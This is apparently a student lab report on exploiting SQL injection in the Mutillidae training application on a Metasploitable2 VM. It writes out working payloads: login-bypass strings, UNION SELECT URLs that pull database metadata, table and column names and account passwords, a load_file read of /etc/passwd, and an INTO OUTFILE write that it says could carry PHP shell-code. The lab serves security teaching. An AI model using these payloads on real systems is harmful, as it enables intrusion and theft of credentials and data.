Name: Hema dharshini N
reg no : 212223220034

# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![eth8 1](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/650d4cad-5748-4069-bf1d-8cd499d4fce6)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![eth8 2](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/e86808fd-2a79-4efd-b782-a50ddcf2e7ca)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![eth 8 3](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/217765b3-d322-4406-9acf-efd1b91fef37)
Click on the menu Login/Register and register for an account

![eth 8 4](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/994b10c6-f9dc-4f86-9dfa-506e8e3c4be8)
Click on the link “Please register here”
![eth 8 5](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/89f0c530-eb54-4801-afe3-084748352b51)
Click on “Create Account” to display the following page: 
![eth 8 6](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/6e476216-6765-471a-975f-bf655e4d2225)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![eth 8 7](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/5142df6e-7f72-4ea0-9d67-84592c271940)
Click “Login”. The logged in page will show as below:
![eth 8 8](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/2310eabc-d4fd-4e9e-80eb-54955bb35f4e)
## Bypassing login field:
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![eth8 9](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/94b8269e-49fa-49e8-a560-d399fcea9670)

Click the login button and you will see it enter into the administrator page.
![eth 8 28](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/2d9ec1d5-ab4e-41e3-ba27-ad555172bbe7)

## Union-based SQL injection:
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below: img
![img](Screenshot_2023-06-10_13_13_23.png)
![Screenshot 2023-06-10 224221](https://github.com/praveenst13/sqlinjection/assets/118787793/123993df-2a2b-455f-abde-8904a72314dd)


![Screenshot 2023-06-10 224420](https://github.com/praveenst13/sqlinjection/assets/118787793/9b365f7e-d511-4ff4-a5fb-d33ee779cb86)

![Screenshot 2023-06-10 224452](https://github.com/praveenst13/sqlinjection/assets/118787793/7b70cf08-aa04-4ba1-b7e5-12f048c98c57)

![Screenshot 2023-06-10 224520](https://github.com/praveenst13/sqlinjection/assets/118787793/713a7087-4c4a-49a0-8c23-92af437df4b1)

![Screenshot 2023-06-10 224530](https://github.com/praveenst13/sqlinjection/assets/118787793/a242176f-df4f-4eb2-8296-0671fd7d7264)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![eth 8 15](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/d8b5f209-54a7-4e9c-a506-be4d04a092b9)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 16](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/7c4d0179-0d0b-4de7-b23c-aa2c6c1d78f2)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![eth 8 17](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/200b0f88-00af-4877-a112-c07dfc9ae425)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![eth 8 18](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/a6e24728-1238-41dd-bae2-f09b7b8a7db8)
As it is having 5 columns the query worked fine and it provides the correct result
![eth 8 19](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/532dffdf-3d42-40c6-b775-5b7429696bc8)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![eth 8 20](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/b6b69a95-b8a5-4fe9-bcff-4a7315f24769)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![eth 8 21](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/b93c11a0-a12c-4cab-87fc-fa521adf9d28)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 22](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/2328344d-084c-4585-b51e-a9009d8b9b4a)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 23](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/644d7f1c-3039-494b-a622-8799c41f3ebc)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![eth 8 24](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/618b3e09-dc41-494b-83b2-572dc28d5074)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 25](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/d5c5fcd8-774b-4d38-8ee0-73b71cec39a0)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 26](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/de94446f-a496-4fc6-9986-629eaac4536b)
## Reading and writing files on the web-server:
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![eth 8 27](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/9a7cf898-b0bd-458b-a945-7eab736b7f88)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
